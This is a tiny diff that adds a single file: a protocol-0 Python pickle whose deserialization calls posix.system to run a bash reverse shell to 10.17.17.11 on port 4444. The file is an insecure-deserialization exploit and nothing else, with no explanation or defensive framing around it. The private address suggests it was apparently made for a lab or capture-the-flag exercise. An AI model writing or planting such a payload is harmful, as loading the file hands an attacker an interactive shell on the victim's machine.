@@ -1,0 +1,7 @@
+cposix
+system
+p1
+(S"bash -c 'bash -i >& /dev/tcp/10.17.17.11/4444 0>&1'"
+p2
+tRp3
+.
